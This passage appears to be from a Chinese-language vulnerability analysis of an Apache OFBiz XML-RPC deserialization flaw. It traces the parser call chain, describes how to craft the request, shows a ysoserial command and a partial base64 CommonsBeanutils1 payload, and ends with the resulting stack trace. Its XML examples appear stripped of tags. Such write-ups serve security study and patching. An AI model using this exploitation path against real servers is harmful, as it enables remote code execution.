                foo
                aa
响应
    messagePONG
说明成功调用ping方法
### 反序列化点
在`Ofbiz`自带的第三方库`xmlrpc-common-3.1.3.jar`中的`org.apache.xmlrpc.parser.SerializableParser`类能明显地看到对数据的还原操作，如果gadget到达此处能直接被反序列化而不会被过滤。
### 解析XML
回到`org.apache.ofbiz.webapp.control.RequestHandler#runEvent()`方法，在其随后调用的链中，注意到`getRequest()`方法
    org.apache.ofbiz.webapp.control.RequestHandler.runEvent()
      org.apache.ofbiz.webapp.event.XmlRpcEventHandler.invoke()
        org.apache.ofbiz.webapp.event.XmlRpcEventHandler.execute()
          org.apache.ofbiz.webapp.event.XmlRpcEventHandler.getRequest()
在getRequest()中，传入的xml数据由第三方库`xmlrpc-common.jar`来进行解析（注意到此处做了XXE防护）
该类的初始化由父类`org.apache.xmlrpc.parser.RecursiveTypeParserImpl`完成，顾名思义就是递归解析，其他的便是常规的xml元素解析操作，包括`startElement()`、`endElement()`等。我们知道在解析器解析xml数据的过程中，会触发到`scanDocument()`操作对元素进行逐一“扫描”，其中就会进行`startElement()`、`endElement()`的调用，这个过程如果处理不当就会引入问题。
注意到在`endElement()`方法中对于`value`标签的处理，同样由父类完成，跟入`org.apache.xmlrpc.parser.RecursiveTypeParserImpl#endValueTag()`
在`endValueTag()`调用了`getResult()`方法，而这个方法就是上面提到的反序列化目标方法，那么接下来就是构造xml数据发送给`Ofbiz`，如果`value`的标签中存放的值为序列化数据，那么会由`SerializableParser`类进行反序列化进而触发漏洞，调用链是这个样子的
    org.apache.ofbiz.webapp.event.XmlRpcEventHandler.getRequest()
      org.apache.xerces.parsers.AbstractSAXParser.parse()
        org.apache.xerces.impl.XMLDocumentFragmentScannerImpl.scanDocument()
          org.apache.xmlrpc.parser.XmlRpcRequestParser.endElement()
            org.apache.xmlrpc.parser.RecursiveTypeParserImpl.endElement()
              org.apache.xmlrpc.parser.MapParser.endElement()
                org.apache.xmlrpc.parser.RecursiveTypeParserImpl.endValueTag()
                  org.apache.xmlrpc.parser.SerializableParser.getResult()
### PoC构造
接下来的问题就是如何构造出特定的xml数据
以上面的ping方法为例，假设post如下数据
      ping
          test
`Ofbiz`成功解析到`endValueTag()`方法，但是由于`typeParser`属性为空，因此不会进入`getResult()`方法
那么`typeParser`属性是在哪里赋值的呢？
回到`org.apache.xmlrpc.parser.XmlRpcRequestParser#startElement()`，在解析器解析xml标签时，对4类标签（methodCall、params、param、value）有分别的处理，这个处理过程是随着每次遍历标签进行的，当扫描完4个必须提供的标签后，会调用父类的`startElement()`进行处理，而typeParser就是在父类中完成赋值的，随后便通过不同的解析器进入不同的解析流程，还是会调用对应解析器的`startElement`，这个过程是递归的
分析扫描标签的递增过程，发现此处除了4个标签外，还需在``标签中含有额外的标签，才会进入default分支进而对`typeParser`赋值，此时struct就是一个很好的选择，它能把数据作为一个结构体传入。
接着思考如何传入序列化数据，也即如何控制后端通过`SerializableParser`解析数据
还是关注typeParser的赋值过程，这个属性就是最终将要处理不同类型数据的解析器，在`org.apache.xmlrpc.parser.RecursiveTypeParserImpl#startElement()`中，注意到`factory.getParser()`操作，将由`org.apache.xmlrpc.common.TypeFactoryImpl`类获得不同数据类型的解析类，在其中就有获取`SerializableParser`的过程
因此只要传入``标签便会由`SerializableParser`进行解析。
此时还有个前提条件，那就是标签属性必须带有`XmlRpcWriter.EXTENSIONS_URI`才会进入后续的判断流程，因此post的数据是这样子的：
      ping
            serialized_data
最后一步，数据的格式
在获取到`SerializableParser`解析器后，startElement过程由父类`org.apache.xmlrpc.parser.ByteArrayParser#startElement()`完成，在其中能看到base64的解码操作，所以最终的序列化数据是需要通过base64传输的
### 漏洞利用
`Ofbiz`中存在Commons-Beanutils库，所以使用ysoserial直接生成CommonsBeanutils1的payload
    > java -jar ysoserial-0.0.6-SNAPSHOT-all.jar CommonsBeanutils1 calc | base64 |tr -d "\n"
    rO0ABXNyABdqYXZhLnV0aWwuUHJpb3JpdHlRdWV1ZZTaMLT7P4KxAwACSQAEc2l6ZUwACmNvbXBhcmF0b3J0ABZMamF2YS91dGlsL0NvbXBhcmF0b3I7eHAAAAACc3IAK29yZy5hcGFjaGUuY29tbW9ucy5iZ...
填充serialized_data并发送
调用链
    java.lang.RuntimeException: InvocationTargetException: java.lang.reflect.InvocationTargetException
        at org.apache.commons.beanutils.BeanComparator.compare(BeanComparator.java:171) ~[commons-beanutils-1.9.3.jar:1.9.3]
        at java.util.PriorityQueue.siftDownUsingComparator(PriorityQueue.java:721) ~[?:1.8.0_141]
        at java.util.PriorityQueue.siftDown(PriorityQueue.java:687) ~[?:1.8.0_141]
        at java.util.PriorityQueue.heapify(PriorityQueue.java:736) ~[?:1.8.0_141]
        at java.util.PriorityQueue.readObject(PriorityQueue.java:795) ~[?:1.8.0_141]
        at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method) ~[?:1.8.0_141]
        at sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:62) ~[?:1.8.0_141]
        at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43) ~[?:1.8.0_141]
        at java.lang.reflect.Method.invoke(Method.java:498) ~[?:1.8.0_141]
        at java.io.ObjectStreamClass.invokeReadObject(ObjectStreamClass.java:1058) ~[?:1.8.0_141]
        at java.io.ObjectInputStream.readSerialData(ObjectInputStream.java:2136) ~[?:1.8.0_141]
        at java.io.ObjectInputStream.readOrdinaryObject(ObjectInputStream.java:2027) ~[?:1.8.0_141]
        at java.io.ObjectInputStream.readObject0(ObjectInputStream.java:1535) ~[?:1.8.0_141]
        at java.io.ObjectInputStream.readObject(ObjectInputStream.java:422) ~[?:1.8.0_141]
        at org.apache.xmlrpc.parser.SerializableParser.getResult(SerializableParser.java:36) ~[xmlrpc-common-3.1.3.jar:3.1.3]
        at org.apache.xmlrpc.parser.RecursiveTypeParserImpl.endValueTag(RecursiveTypeParserImpl.java:78) ~[xmlrpc-common-3.1.3.jar:3.1.3]
        at org.apache.xmlrpc.parser.MapParser.endElement(MapParser.java:185) ~[xmlrpc-common-3.1.3.jar:3.1.3]
        at org.apache.xmlrpc.parser.RecursiveTypeParserImpl.endElement(RecursiveTypeParserImpl.java:103) ~[xmlrpc-common-3.1.3.jar:3.1.3]
        at org.apache.xmlrpc.parser.XmlRpcRequestParser.endElement(XmlRpcRequestParser.java:165) ~[xmlrpc-common-3.1.3.jar:3.1.3]
        at org.apache.xerces.parsers.AbstractSAXParser.endElement(Unknown Source) ~[xercesImpl-2.9.1.jar:?]
        at org.apache.xerces.impl.XMLNSDocumentScannerImpl.scanEndElement(Unknown Source) ~[xercesImpl-2.9.1.jar:?]
        at org.apache.xerces.impl.XMLDocumentFragmentScannerImpl$FragmentContentDispatcher.dispatch(Unknown Source) ~[xercesImpl-2.9.1.jar:?]
        at org.apache.xerces.impl.XMLDocumentFragmentScannerImpl.scanDocument(Unknown Source) ~[xercesImpl-2.9.1.jar:?]
        at org.apache.xerces.parsers.XML11Configuration.parse(Unknown Source) ~[xercesImpl-2.9.1.jar:?]
        at org.apache.xerces.parsers.XML11Configuration.parse(Unknown Source) ~[xercesImpl-2.9.1.jar:?]
        at org.apache.xerces.parsers.XMLParser.parse(Unknown Source) ~[xercesImpl-2.9.1.jar:?]
        at org.apache.xerces.parsers.AbstractSAXParser.parse(Unknown Source) ~[xercesImpl-2.9.1.jar:?]
        at org.apache.xerces.jaxp.SAXParserImpl$JAXPSAXParser.parse(Unknown Source) ~[xercesImpl-2.9.1.jar:?]
        at org.apache.ofbiz.webapp.event.XmlRpcEventHandler.getRequest(XmlRpcEventHandler.java:285) ~[ofbiz.jar:?]
        at org.apache.ofbiz.webapp.event.XmlRpcEventHandler.execute(XmlRpcEventHandler.java:229) [ofbiz.jar:?]
        at org.apache.ofbiz.webapp.event.XmlRpcEventHandler.invoke(XmlRpcEventHandler.java:145) [ofbiz.jar:?]
        at org.apache.ofbiz.webapp.control.RequestHandler.runEvent(RequestHandler.java:741) [ofbiz.jar:?]
        at org.apache.ofbiz.webapp.control.RequestHandler.doRequest(RequestHandler.java:465) [ofbiz.jar:?]
        at org.apache.ofbiz.webapp.control.ControlServlet.doGet(ControlServlet.java:217) [ofbiz.jar:?]
        at org.apache.ofbiz.webapp.control.ControlServlet.doPost(ControlServlet.java:91) [ofbiz.jar:?]